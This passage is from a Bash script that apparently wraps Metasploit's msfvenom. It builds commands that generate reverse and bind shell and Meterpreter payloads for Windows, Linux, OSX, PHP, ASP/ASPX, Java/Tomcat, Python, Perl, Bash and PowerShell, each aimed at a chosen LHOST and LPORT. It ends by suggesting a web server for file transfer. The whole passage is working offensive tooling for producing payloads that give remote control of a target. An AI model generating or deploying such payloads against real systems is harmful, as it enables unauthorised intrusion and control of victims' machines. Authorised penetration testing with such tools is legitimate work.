  if [[ -z "${TYPE}" || "${TYPEs[${i}]}" == "${TYPE}" || "${FORMATs[${i}]}" == "${TYPE}" ]]; then
    type="${TYPEs[${i}]}"
    [[ -n "${TYPE}" && "${FORMATs[${i}]}" == "${TYPE}" ]] && type="${FORMATs[${i}]}"
    for shell in "meterpreter" "shell"; do
    if [[ -z "${SHELL}" || "${shell}" == "${SHELL}" ]]; then
      for direction in "reverse" "bind"; do
      if [[ -z "${DIRECTION}" || "${direction}" == "${DIRECTION}" ]]; then
        for staged in "staged" "stageless"; do
        if [[ -z "${STAGE}" || "${staged}" == "${STAGE}" ]]; then
          for method in "tcp" "http" "https" "find_port"; do
          if [[ -z "${METHOD}" || "${method}" == "${METHOD}" ]]; then
            echo ""   # "${type}" "${IP}" "${PORT}" "${direction}" "${staged}" "${method}"  "${shell}" "${_VERBOSE}"
            eval "${0}" "${type}" "${IP}" "${PORT}" "${direction}" "${staged}" "${method}"  "${shell}" "${_VERBOSE}"
            echo ""
          fi        # "${method}" == "${METHOD}"
          done      # for protocol
        fi        # "${staged}" == "${STAGE}"
        done      # for staged
      fi        # "${direction}" == "${DIRECTION}"
      done      # for direction
    fi        # "${shell}" == "${SHELL}"
    done      # for shell
    echo -e "\n"
  fi        # "${TYPEs[${i}]}" == "${TYPE}"
  done      # for TYPEs[@]
fi


## Set default values (after batch/loop)
[[ -z "${METHOD}" ]] && METHOD="tcp"
[[ -z "${DIRECTION}" ]] && DIRECTION="reverse"

## Valid shell?
if [[ -n "${TYPE}" && "${SHELL}" != "shell" && "${SHELL}" != "meterpreter" && -n "${SHELL}" ]]; then
  echo -e " ${YELLOW}[i]${RESET} SHELL (${SHELL}) is incorrect. Needs to be either ${YELLOW}shell${RESET} or ${YELLOW}meterpreter${RESET}" >&2
  exit 3
fi

## Valid staged?
if [[ -n "${TYPE}" && "${STAGE}" != "staged" && "${STAGE}" != "stageless" && -n "${STAGE}" ]]; then
  echo -e " ${YELLOW}[i]${RESET} STAGED (${STAGE}) is incorrect. Needs to be either ${YELLOW}staged${RESET} or ${YELLOW}stageless${RESET}" >&2
  exit 3
elif [[ -n "${TYPE}" && "${_STAGE}" != "/" && "${_STAGE}" != "_" && -n "${STAGE}" ]]; then    #  "${STAGE}" != "" is correct
  echo -e " ${YELLOW}[i]${RESET} ${RED}Something went wrong (Internally) with stage: ${_STAGE}.${RESET}"
  exit 2
fi

## If its not reverse (bind), the only option is tcp (not http/https/find_ports)
if [[ "${DIRECTION}" != "reverse" && "${METHOD}" != "tcp" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Unable to use ${METHOD} with ${DIRECTION}. Please ${YELLOW}switch to reverse${RESET}" >&2
  exit 3
fi


## Generate #2 (Single Payload)
## ASP
if [[ "${TYPE}" == "asp" ]]; then
  [[ -z "${SHELL}" ]] && SHELL="meterpreter"
  [[ -z "${STAGE}"  ]] && STAGE="staged" && _STAGE="/"
  [[ "${METHOD}" == "find_port" ]] && METHOD="allports"
  # Can't do: stageless meterpreter - The EXE generator now has a max size of 2048 bytes, please fix the calling module
  if [[ "${STAGE}" == "stageless" && "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} ASP. The result is over Metasploit's ${RED}file size limit${RESET}. =(" >&2
    #[[ "${VERBOSE}" != 'true' ]] && exit 5   # Force pass the warning?
  fi
  TYPE="windows"
  FILEEXT="asp"
  PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## ASPX
elif [[ "${TYPE}" == "aspx" ]]; then
  [[ -z "${SHELL}" ]] && SHELL="meterpreter"
  [[ -z "${STAGE}"  ]] && STAGE="staged" && _STAGE="/"
  [[ "${METHOD}" == "find_port" ]] && METHOD="allports"
  # Its able todo anything that you throw at it =).
  TYPE="windows"
  FILEEXT="aspx"
  PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## Bash
elif [[ "${TYPE}" == "bash" || "${TYPE}" == "sh" ]]; then
  [[ -z "${SHELL}" ]] && SHELL="shell"
  [[ -z "${STAGE}"  ]] && STAGE="staged" && _STAGE="/"
  # Can't do: meterpreter or stageless - Invalid Payload Selected
  # Can't do: bind option // http, https or find_port options
  if [[ "${STAGE}" == "stageless" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE}. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  elif [[ "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${SHELL} Bash. There ${RED}isn't a Bash ${SHELL}${RESET}...yet?" >&2
  elif [[ "${DIRECTION}" != "reverse" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${DIRECTION}. There ${RED}isn't a ${DIRECTION} Bash${RESET}...yet?" >&2
  fi
  TYPE="bash"
  FILEEXT="sh"
  PAYLOAD="cmd/unix${_STAGE}${DIRECTION}_bash"
  CMD="msfvenom -p ${PAYLOAD} -f raw --platform unix -e generic/none -a cmd LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## Java
elif [[ "${TYPE}" == "java" || "${TYPE}" == "jsp" ]]; then
  [[ -z "${SHELL}" ]] && SHELL="meterpreter"
  [[ -z "${STAGE}"  ]] && STAGE="staged" && _STAGE="/"
  # Can't do: stageless meterpreter - Invalid Payload Selected
  if [[ "${STAGE}" == "stageless" && "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} Java. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  fi
  TYPE="java"
  FILEEXT="jsp"
  PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
  CMD="msfvenom -p ${PAYLOAD} -f raw --platform ${TYPE} -e generic/none -a ${TYPE} LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## Linux
elif [[ "${TYPE}" == "linux" || "${TYPE}" == "lin" || "${TYPE}" == "elf" ]]; then
  [[ -z "${SHELL}" ]] && SHELL="shell"
  [[ -z "${STAGE}"  ]] && STAGE="staged" && _STAGE="/"
  # Can't do: stageless meterpreter - Invalid Payload Selected
  if [[ "${STAGE}" == "stageless"  && "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} Linux. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  fi
  TYPE="linux"
  FILEEXT="elf"    #bin
  PAYLOAD="${TYPE}/x86/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## OSX
elif [[ "${TYPE}" == "osx" || "${TYPE}" == "macho" ]]; then
  [[ -z "${SHELL}" ]] && SHELL="shell"
  [[ -z "${STAGE}"  ]] && STAGE="stageless" && _STAGE="_"
  # Can't do: meterpreter or stageless - Invalid Payload Selected
  if [[ "${STAGE}" == "staged" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} OSX. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  elif [[ "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${SHELL} OSX. There ${RED}isn't a OSX Meterpreter${RESET}...yet." >&2
  fi
  TYPE="osx"
  FILEEXT="macho"
  PAYLOAD="osx/x86/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## Perl
elif [[ "${TYPE}" == "perl" || "${TYPE}" == "pl" ]]; then
  [[ -z "${SHELL}" ]] && SHELL="shell"
  [[ -z "${STAGE}"  ]] && STAGE="staged" && _STAGE="/"
  # Can't do: meterpreter or stageless - Invalid Payload Selected
  if [[ "${STAGE}" == "stageless" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} Perl. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  elif [[ "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${SHELL} PERL. There ${RED}isn't a Perl Meterpreter${RESET}...yet." >&2
  fi
  TYPE="linux"
  FILEEXT="pl"
  PAYLOAD="cmd/unix${_STAGE}${DIRECTION}_perl"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform unix -a cmd -e generic/none LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## PHP
elif [[ "${TYPE}" == "php" ]]; then
  [[ -z "${SHELL}" ]] && SHELL="meterpreter"
  [[ -z "${STAGE}"  ]] && STAGE="staged" && _STAGE="/"
  # Can't do: shell - Invalid Payload Selected
  if [[ "${SHELL}" == "shell" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${SHELL} PHP. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  fi
  TYPE="php"
  FILEEXT="php"
  PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
  CMD="msfvenom -p ${PAYLOAD} -f raw --platform ${TYPE} -e generic/none -a ${TYPE} LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## Powershell
elif [[ "${TYPE}" == "powershell" || "${TYPE}" == "ps1" ]]; then
  [[ -z "${SHELL}" ]] && SHELL="meterpreter"
  [[ -z "${STAGE}"  ]] && STAGE="stageless" && _STAGE="_"
  [[ "${METHOD}" == "find_port" ]] && METHOD="allports"
  TYPE="windows"
  FILEEXT="ps1"
  PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
  CMD="msfvenom -p ${PAYLOAD} -f ps1 --platform ${TYPE} -e generic/none -a x86 LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## Python
elif [[ "${TYPE}" == "python" || "${TYPE}" == "py" ]]; then
  [[ -z "${SHELL}" ]] && SHELL="meterpreter"
  [[ -z "${STAGE}"  ]] && STAGE="staged" && _STAGE="/"
  # Cant do: staged shell // stageless meterpreter // stageless bind - Invalid Payload Selected
  if [[ "${STAGE}" == "staged" && "${SHELL}" == "shell" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} Python. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  elif [[ "${STAGE}" == "stageless" && "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} Python. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  elif [[ "${STAGE}" == "stageless" && "${DIRECTION}" == "bind" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${DIRECTION} Python. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  fi
  TYPE="python"
  FILEEXT="py"
  PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
  CMD="msfvenom -p ${PAYLOAD} -f raw --platform ${TYPE} -e generic/none -a ${TYPE} LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## Tomcat
elif [[ "${TYPE}" == "tomcat" || "${TYPE}" == "war" ]]; then
  [[ -z "${SHELL}" ]] && SHELL="meterpreter"
  [[ -z "${STAGE}"  ]] && STAGE="staged" && _STAGE="/"
  # Cant do: stageless meterpreter // stageless bind // find_ports    (Invalid Payload Selected)
  if [[ "${STAGE}" == "stageless" && "${SHELL}" == "meterpreter" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} Tomcat. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  elif [[ "${STAGE}" == "stageless" && "${DIRECTION}" == "bind" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${DIRECTION} ${STAGE} Tomcat. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  elif [[ "${METHOD}" == "find_ports" ]]; then
    echo -e " ${YELLOW}[i]${RESET} Unable to do ${METHOD} Tomcat. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(" >&2
  fi
  TYPE="tomcat"
  FILEEXT="war"
  PAYLOAD="java/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
  CMD="msfvenom -p ${PAYLOAD} -f raw --platform java -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

## Windows
elif [[ "${TYPE}" == "windows" || "${TYPE}" == "win" || "${TYPE}" == "exe" ]]; then
  [[ -z "${SHELL}" ]] && SHELL="meterpreter"
  [[ -z "${STAGE}"  ]] && STAGE="staged" && _STAGE="/"
  [[ "${METHOD}" == "find_port" ]] && METHOD="allports"
  # Its able todo anything that you throw at it =).
  TYPE="windows"
  FILEEXT="exe"
  PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} --platform ${TYPE} -a x86 -e generic/none LHOST=${IP} LPORT=${PORT} > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"

# Batch/Loop modes
elif [[ "${BATCH}" == "true" || "${LOOP}" == "true" ]]; then
  #SUCCESS=true
  exit 0

# Blank input
elif [[ -z "${TYPE}" ]]; then
  echo -e "\n ${YELLOW}[i]${RESET} ${YELLOW}Missing type${RESET}"

# Unexected input
else
  echo -e "\n ${YELLOW}[i]${RESET} Unknown type: ${YELLOW}${TYPE}${RESET}" >&2
fi


#-Done-----------------------------------------------------------------#


##### Done!
if [[ "${SUCCESS}" == true ]]; then
  echo -e " ${GREEN}[?]${RESET} Quick ${GREEN}web server${RESET} for file transfer?   python -m SimpleHTTPServer 8080"
  echo -e " ${BLUE}[*]${RESET} ${BLUE}Done${RESET}!"
else
  doHelp
fi

exit 0
